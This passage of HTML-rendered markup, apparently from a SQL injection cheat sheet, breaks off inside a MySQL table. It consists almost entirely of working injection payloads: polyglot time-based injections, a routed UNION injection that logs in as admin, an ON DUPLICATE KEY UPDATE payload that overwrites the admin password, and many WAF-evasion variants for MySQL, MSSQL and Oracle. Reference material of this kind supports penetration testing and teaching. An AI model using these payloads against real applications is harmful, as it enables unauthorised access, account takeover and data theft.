+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sha1</span>(<span style="color:#e6db74">&#34;3fDf &#34;</span>, <span style="color:#66d9ef">true</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">Q�u</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#a6e22e">�</span><span style="color:#f92672">@</span><span style="color:#a6e22e">�</span>[<span style="color:#a6e22e">�t�</span><span style="color:#f92672">-</span> <span style="color:#a6e22e">o��_</span><span style="color:#f92672">-!</span>
+</span></span></code></pre></div><p>Challenge demo available at 
+  <a href="http://web.jarvisoj.com:32772">http://web.jarvisoj.com:32772</a></p>
+<h2 id="polyglot-injection-multicontext">
+  Polyglot injection (multicontext)
+  <a class="anchor" href="#polyglot-injection-multicontext">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>SLEEP(<span style="color:#ae81ff">1</span>) <span style="color:#75715e">/*&#39; or SLEEP(1) or &#39;&#34; or SLEEP(1) or &#34;*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* MySQL only */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">IF</span>(SUBSTR(<span style="color:#f92672">@@</span><span style="color:#66d9ef">version</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">5</span>,BENCHMARK(<span style="color:#ae81ff">2000000</span>,SHA1(<span style="color:#ae81ff">0</span>xDE7EC71F1)),SLEEP(<span style="color:#ae81ff">1</span>))<span style="color:#75715e">/*&#39;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#39;|&#34;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#34;*/</span>
+</span></span></code></pre></div><h2 id="routed-injection">
+  Routed injection
+  <a class="anchor" href="#routed-injection">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; AND 1=0 UNION ALL SELECT &#39;</span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#ae81ff">81</span>dc9bdb52d04dc20036dbd8313ed055<span style="color:#e6db74">&#39;
+</span></span></span></code></pre></div><h2 id="insert-statement---on-duplicate-key-update">
+  Insert Statement - ON DUPLICATE KEY UPDATE
+  <a class="anchor" href="#insert-statement---on-duplicate-key-update">#</a>
+</h2>
+<p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Inject <span style="color:#66d9ef">using</span> payload:
+</span></span><span style="display:flex;"><span>  attacker_dummy<span style="color:#f92672">@</span>example.com<span style="color:#e6db74">&#34;, &#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34;), (&#34;</span><span style="color:#66d9ef">admin</span><span style="color:#f92672">@</span>example.com<span style="color:#e6db74">&#34;, &#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34;) ON DUPLICATE KEY UPDATE password=&#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34; --
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The query would look like this:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">INSERT INTO users (email, password) VALUES (&#34;</span>attacker_dummy<span style="color:#f92672">@</span>example.com<span style="color:#e6db74">&#34;, &#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34;), (&#34;</span><span style="color:#66d9ef">admin</span><span style="color:#f92672">@</span>example.com<span style="color:#e6db74">&#34;, &#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34;) ON DUPLICATE KEY UPDATE password=&#34;</span>bcrypt_hash_of_qwerty<span style="color:#e6db74">&#34; -- &#34;</span>, <span style="color:#e6db74">&#34;bcrypt_hash_of_your_password_input&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This query will <span style="color:#66d9ef">insert</span> a <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">for</span> the <span style="color:#66d9ef">user</span> <span style="color:#960050;background-color:#1e0010">“</span>attacker_dummy<span style="color:#f92672">@</span>example.com<span style="color:#960050;background-color:#1e0010">”</span>. It will also <span style="color:#66d9ef">insert</span> a <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">for</span> the <span style="color:#66d9ef">user</span> <span style="color:#960050;background-color:#1e0010">“</span><span style="color:#66d9ef">admin</span><span style="color:#f92672">@</span>example.com<span style="color:#960050;background-color:#1e0010">”</span>.
+</span></span><span style="display:flex;"><span>Because this <span style="color:#66d9ef">row</span> already <span style="color:#66d9ef">exists</span>, the <span style="color:#66d9ef">ON</span> DUPLICATE <span style="color:#66d9ef">KEY</span> <span style="color:#66d9ef">UPDATE</span> keyword tells MySQL <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">update</span> the <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span> <span style="color:#66d9ef">column</span> <span style="color:#66d9ef">of</span> the already <span style="color:#66d9ef">existing</span> <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">to</span> <span style="color:#e6db74">&#34;bcrypt_hash_of_qwerty&#34;</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">After</span> this, we can simply authenticate <span style="color:#66d9ef">with</span> <span style="color:#960050;background-color:#1e0010">“</span><span style="color:#66d9ef">admin</span><span style="color:#f92672">@</span>example.com<span style="color:#960050;background-color:#1e0010">”</span> <span style="color:#66d9ef">and</span> the password <span style="color:#960050;background-color:#1e0010">“</span>qwerty<span style="color:#960050;background-color:#1e0010">”</span><span style="color:#f92672">!</span>
+</span></span></code></pre></div><h2 id="waf-bypass">
+  WAF Bypass
+  <a class="anchor" href="#waf-bypass">#</a>
+</h2>
+<h3 id="white-spaces-alternatives">
+  White spaces alternatives
+  <a class="anchor" href="#white-spaces-alternatives">#</a>
+</h3>
+<p>No Space (%20) - bypass using whitespace alternatives</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#66d9ef">and</span><span style="color:#f92672">%</span><span style="color:#ae81ff">091</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Dand<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>D1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>D<span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Cand<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>C1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Band<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>B1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>B<span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Aand<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A<span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span>A0and<span style="color:#f92672">%</span>A01<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">%</span>A0<span style="color:#75715e">--
+</span></span></span></code></pre></div><p>No Whitespace - bypass using comments</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#75715e">/*comment*/</span><span style="color:#66d9ef">and</span><span style="color:#75715e">/**/</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#75715e">/**/</span><span style="color:#75715e">--
+</span></span></span></code></pre></div><p>No Whitespace - bypass using parenthesis</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span>(<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">and</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>(<span style="color:#ae81ff">1</span>)<span style="color:#75715e">--
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Whitespace alternatives <span style="color:#66d9ef">by</span> DBMS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> DBMS <span style="color:#f92672">|</span> ASCII characters <span style="color:#66d9ef">in</span> hexadicimal <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#75715e">---- | ------------------------------- |
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> SQLite3 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MySQL	<span style="color:#ae81ff">5</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>B, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">0</span>D, A0, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MySQL	<span style="color:#ae81ff">3</span>	<span style="color:#f92672">|</span> <span style="color:#ae81ff">01</span>, <span style="color:#ae81ff">02</span>, <span style="color:#ae81ff">03</span>, <span style="color:#ae81ff">04</span>, <span style="color:#ae81ff">05</span>, <span style="color:#ae81ff">06</span>, <span style="color:#ae81ff">07</span>, <span style="color:#ae81ff">08</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>B, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span>E, <span style="color:#ae81ff">0</span>F, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">1</span>A, <span style="color:#ae81ff">1</span>B, <span style="color:#ae81ff">1</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">1</span>D, <span style="color:#ae81ff">1</span>E, <span style="color:#ae81ff">1</span>F, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">7</span>F, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">8</span>D, <span style="color:#ae81ff">8</span>F, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">9</span>D, A0 <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> PostgreSQL <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Oracle <span style="color:#ae81ff">11</span><span style="color:#66d9ef">g</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">00</span>, <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MSSQL <span style="color:#f92672">|</span> <span style="color:#ae81ff">01</span>, <span style="color:#ae81ff">02</span>, <span style="color:#ae81ff">03</span>, <span style="color:#ae81ff">04</span>, <span style="color:#ae81ff">05</span>, <span style="color:#ae81ff">06</span>, <span style="color:#ae81ff">07</span>, <span style="color:#ae81ff">08</span>, <span style="color:#ae81ff">09</span>, <span style="color:#ae81ff">0</span>A, <span style="color:#ae81ff">0</span>B, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">0</span>D, <span style="color:#ae81ff">0</span>E, <span style="color:#ae81ff">0</span>F, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">1</span>A, <span style="color:#ae81ff">1</span>B, <span style="color:#ae81ff">1</span><span style="color:#66d9ef">C</span>, <span style="color:#ae81ff">1</span>D, <span style="color:#ae81ff">1</span>E, <span style="color:#ae81ff">1</span>F, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
+</span></span></code></pre></div><p>Example of query where spaces were replaced by ascii characters above 0x80</p>
+<pre tabindex="0"><code>♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
+</code></pre><h3 id="no-comma">
+  No Comma
+  <a class="anchor" href="#no-comma">#</a>
+</h3>
+<p>Bypass using OFFSET, FROM and JOIN</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>         <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">OFFSET</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>SUBSTR(<span style="color:#e6db74">&#39;SQL&#39;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">-&gt;</span> SUBSTR(<span style="color:#e6db74">&#39;SQL&#39;</span> <span style="color:#66d9ef">FROM</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">FOR</span> <span style="color:#ae81ff">1</span>).
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>    <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>)a <span style="color:#66d9ef">JOIN</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">2</span>)b <span style="color:#66d9ef">JOIN</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">3</span>)<span style="color:#66d9ef">c</span> <span style="color:#66d9ef">JOIN</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">4</span>)d
+</span></span></code></pre></div><h3 id="no-equal">
+  No Equal
+  <a class="anchor" href="#no-equal">#</a>
+</h3>
+<p>Bypass using LIKE/NOT IN/IN/BETWEEN</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">like</span>(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">not</span> <span style="color:#66d9ef">in</span>(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">in</span>(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">between</span> <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">4</span>
+</span></span></code></pre></div><h3 id="case-modification">
+  Case modification
+  <a class="anchor" href="#case-modification">#</a>
+</h3>
+<p>Bypass using uppercase/lowercase (see keyword AND)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AnD</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">aNd</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">#</span>
+</span></span></code></pre></div><p>Bypass using keywords case insensitive / Bypass using an equivalent operator</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span>   <span style="color:#f92672">-&gt;</span> <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">OR</span>    <span style="color:#f92672">-&gt;</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>     <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">LIKE</span>,REGEXP, <span style="color:#66d9ef">BETWEEN</span>, <span style="color:#66d9ef">not</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">not</span> <span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> X   <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">not</span> <span style="color:#66d9ef">between</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">and</span> X
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">HAVING</span>
+</span></span></code></pre></div><h3 id="obfuscation-by-dbms">
+  Obfuscation by DBMS
+  <a class="anchor" href="#obfuscation-by-dbms">#</a>
+</h3>
+<p>MySQL</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>.<span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>.<span style="color:#ae81ff">2</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>e0UNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#960050;background-color:#1e0010">\</span>N<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>.e3UNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>e1AND<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#75715e">/*!12345UNION/*!31337SELECT/*!table_name*/	
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">{ts	1}UNION	SELECT.``	1.e.table_name	
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT	$.``	1.e.table_name	
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT{_	.``1.e.table_name}	
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT	LightOS	.	``1.e.table_name	LightOS	
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT	information_schema 1337.e.tables	13.37e.table_name	
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT	1	from	information_schema 9.e.table_name
+</span></span></span></code></pre></div><p>MSSQL</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>.<span style="color:#ae81ff">1</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>.<span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>.<span style="color:#ae81ff">2</span><span style="color:#66d9ef">alias</span>	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>e0UNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>e1AND<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">0</span>xUNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">1</span><span style="color:#66d9ef">FROM</span>[<span style="color:#66d9ef">table</span>]<span style="color:#66d9ef">WHERE</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">AND</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span>	
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#e6db74">&#34;table_name&#34;</span><span style="color:#66d9ef">FROM</span>[information_schema].[tables]	
+</span></span></code></pre></div><p>Oracle</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>FUNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>DUNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">0</span>x7461626c655f6e616d65	<span style="color:#66d9ef">FROM</span>	all_tab_tables
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>	CHR(<span style="color:#ae81ff">116</span>)	<span style="color:#f92672">||</span>	CHR(<span style="color:#ae81ff">97</span>)	<span style="color:#f92672">||</span>	CHR(<span style="color:#ae81ff">98</span>)	<span style="color:#66d9ef">FROM</span>	all_tab_tables
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#66d9ef">table_name</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#66d9ef">FROM</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span>all_tab_tables
+</span></span></code></pre></div><h3 id="more-mysql-specific">
+  More MySQL specific
+  <a class="anchor" href="#more-mysql-specific">#</a>
+</h3>
+<p><code>information_schema.tables</code> alternative</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> mysql.innodb_table_stats;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
